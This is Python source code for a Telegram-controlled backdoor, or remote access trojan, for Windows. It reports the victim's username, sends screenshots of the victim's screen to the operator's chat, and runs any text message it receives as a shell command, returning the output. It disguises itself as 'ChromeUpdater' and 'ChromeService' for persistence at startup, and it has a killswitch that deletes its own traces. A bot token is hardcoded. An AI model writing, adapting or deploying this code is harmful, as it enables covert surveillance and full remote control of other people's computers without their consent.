from telegram.ext import Updater,CommandHandler,MessageHandler,Filters
import os
import pyautogui

TOKEN = "5913616404:AAFW9HlRZqCEmh3EgBe8pOfVayRiz_zxvPM"

def start(update,context):
    username = ""
    req = os.popen("echo %username%")

    for us in req:
        username+= us

    update.message.reply_text(f"Connection Established => {username} PC")

def answer(update,context):
    testo = update.message.text.lower()

    if "savescreen" in testo:

        img = pyautogui.screenshot()
        img.save("photo.png")

        update.message.reply_photo(open("photo.png","rb"))

        os.system("del photo.png")
    
    elif "killswitch" in testo:
        update.message.reply_text("Backdoor Deleted !")

        os.system('del "C:\Users\Beluga\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ChromeUpdater.lnk"')

        os.system("taskkill /IM python.exe /F")

        os.system("echo S | del C:/Users/Beluga/AppData/Local/Programs/ChromeService/chrome")

        os.system("echo D | rmdir C:/Users/Beluga/AppData/Local/Programs/ChromeService/chrome")

        os.system("echo S | del C:/Users/Beluga/AppData/Local/Programs/ChromeService")

        os.system("echo D | rmdir C:/Users/Beluga/AppData/Local/Programs/ChromeService")

        os.system("ipconfig/flushdns")
        
    else:
        try:
                
            command = ""
            response = os.popen(testo)

            msg = update.message.reply_text("Command is Executing....")
            
            for line in response:
                command+= line
            
            msg.edit_text(command)
        
        except Exception:
            msg.edit_text("Command NOT Valid !")
        
updater = Updater(TOKEN)
updater.dispatcher.add_handler(CommandHandler('start', start))
updater.dispatcher.add_handler(MessageHandler(Filters.text, answer))
print("Bot is listening....")
updater.start_polling()
